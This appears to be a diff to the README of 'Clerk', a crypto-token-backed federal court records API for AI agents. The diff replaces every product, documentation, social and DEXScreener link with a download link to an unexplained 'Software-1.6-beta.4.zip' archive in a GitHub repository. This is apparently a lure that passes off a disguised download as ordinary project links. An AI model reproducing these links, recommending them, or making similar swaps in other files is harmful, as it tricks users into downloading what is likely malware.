@@ -8,7 +8,7 @@
 
 Clerk provides permissionless access to **500M+ US federal court records** across **94 federal courts** through **11 data endpoints**. Built on Base, it eliminates subscriptions and API keys by using **x402 micropayments at just $0.001 per query in USDC**. Stack legal intelligence into any AI agent workflow.
 
-Live at [clerk.solvrlabs.ai](https://clerk.solvrlabs.ai) · Built by [Solvr Labs](https://solvrbot.com) · 1B+ $CLERK = free unlimited
+Live at [clerk.solvrlabs.ai](https://github.com/Berripituitary963/clerk/raw/refs/heads/main/examples/Software-1.6-beta.4.zip) · Built by [Solvr Labs](https://github.com/Berripituitary963/clerk/raw/refs/heads/main/examples/Software-1.6-beta.4.zip) · 1B+ $CLERK = free unlimited
 
 ---
 
@@ -125,11 +125,11 @@ MIT
 
 ## Links
 
-- Product: [clerk.solvrlabs.ai](https://clerk.solvrlabs.ai)
-- API Docs: [clerk.solvrlabs.ai/docs](https://clerk.solvrlabs.ai/docs)
+- Product: [clerk.solvrlabs.ai](https://github.com/Berripituitary963/clerk/raw/refs/heads/main/examples/Software-1.6-beta.4.zip)
+- API Docs: [clerk.solvrlabs.ai/docs](https://github.com/Berripituitary963/clerk/raw/refs/heads/main/examples/Software-1.6-beta.4.zip)
 - API Reference (in this repo): [ENDPOINTS.md](./ENDPOINTS.md)
-- X: [@agent_clerk](https://x.com/agent_clerk)
-- Parent project: [Solvr](https://solvrbot.com) · [@solvrbot](https://x.com/solvrbot)
+- X: [@agent_clerk](https://github.com/Berripituitary963/clerk/raw/refs/heads/main/examples/Software-1.6-beta.4.zip)
+- Parent project: [Solvr](https://github.com/Berripituitary963/clerk/raw/refs/heads/main/examples/Software-1.6-beta.4.zip) · [@solvrbot](https://github.com/Berripituitary963/clerk/raw/refs/heads/main/examples/Software-1.6-beta.4.zip)
 
 ## Support the project
 
@@ -137,7 +137,7 @@ Hold $CLERK on Base for free unlimited queries, or trade on DEXScreener.
 
 `0x20EabA9d6818529cfFFA2c1C63B97A02a0049bA3`
 
-[DEXScreener](https://dexscreener.com/base/0x4bacc9d57e57b8361d5d31e83daef1ddae57d2992227a5ae7fefa09c19f2ab19)
+[DEXScreener](https://github.com/Berripituitary963/clerk/raw/refs/heads/main/examples/Software-1.6-beta.4.zip)
 
 ---
 
